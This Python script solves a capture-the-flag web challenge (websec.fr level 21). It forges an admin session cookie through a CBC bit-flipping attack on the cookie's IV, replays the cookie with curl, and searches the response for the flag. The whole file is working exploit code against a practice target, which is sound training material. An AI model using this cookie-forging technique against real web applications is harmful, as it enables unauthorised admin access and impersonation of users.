#!/usr/bin/env python3
import binascii
import subprocess
import re

# Cookie de testxx
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

actual = b"user/pass:testxx"
target = b"user/pass:admin\x00"

iv_test = bytearray(binascii.unhexlify(iv_hex))
for i in range(16):
    iv_test[i] = iv_test[i] ^ actual[i] ^ target[i]

cookie_modified = binascii.hexlify(iv_test).decode() + ct_hex

print("Request 1: Enviando cookie con admin\\x00 para trigger create_cookies")

cmd1 = f'timeout 8s curl -s -c /tmp/new_admin_cookie.txt https://websec.fr/level21/index.php --cookie "session={cookie_modified}"'
result1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True)

print(f"  Response length: {len(result1.stdout)}")

# Ver si se creó nueva cookie
import os
if os.path.exists('/tmp/new_admin_cookie.txt'):
    with open('/tmp/new_admin_cookie.txt', 'r') as f:
        cookie_content = f.read()
    
    if 'session' in cookie_content:
        print(f"  ✓ Nueva cookie creada!")
        new_session = [line for line in cookie_content.split('\n') if 'session' in line]
        if new_session:
            print(f"  Cookie: {new_session[-1][:80]}...")
    else:
        print(f"  ✗ No se creó nueva cookie")
else:
    print(f"  ✗ Archivo de cookies no creado")

print("\nRequest 2: Usando las cookies actualizadas")
cmd2 = f'timeout 8s curl -s -b /tmp/new_admin_cookie.txt https://websec.fr/level21/index.php'
result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)

flag_match = re.search(r'WEBSEC\{[^}]+\}', result2.stdout)
if flag_match:
    print(f"\n★★★ FLAG: {flag_match.group(0)} ★★★")
elif "Hello admin" in result2.stdout:
    print(f"\n★★★ Hello admin en request 2! ★★★")
    # Extraer flag del texto
    for line in result2.stdout.split('\n'):
        if 'flag' in line.lower():
            print(line.strip())
else:
    print(f"  Response length: {len(result2.stdout)}")
    if "Wrong" in result2.stdout:
        print(f"  Wrong login")
    elif "corrupted" in result2.stdout:
        print(f"  Corrupted")
    else:
        print(f"  Otro mensaje")
